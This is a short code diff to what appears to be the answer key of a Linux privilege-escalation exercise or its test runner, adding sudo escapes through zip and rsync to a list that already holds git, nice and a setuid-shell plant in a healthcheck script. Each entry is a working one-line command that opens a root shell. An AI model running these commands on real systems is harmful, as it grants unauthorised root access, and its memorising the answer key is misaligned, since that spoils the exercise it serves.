@@ -103,6 +103,8 @@ const SOLUTIONS = {
     33: ['sudo git -p help !/bin/sh'],
     34: ['sudo nice /bin/sh'],
     35: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/monitor/healthcheck.sh', 'wait'],
+    36: ['sudo zip test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"'],
+    37: ['sudo rsync -e "/bin/sh -c /bin/sh" 127.0.0.1:/dev/null /dev/null'],
 };
 
 let pass = 0, fail = 0;
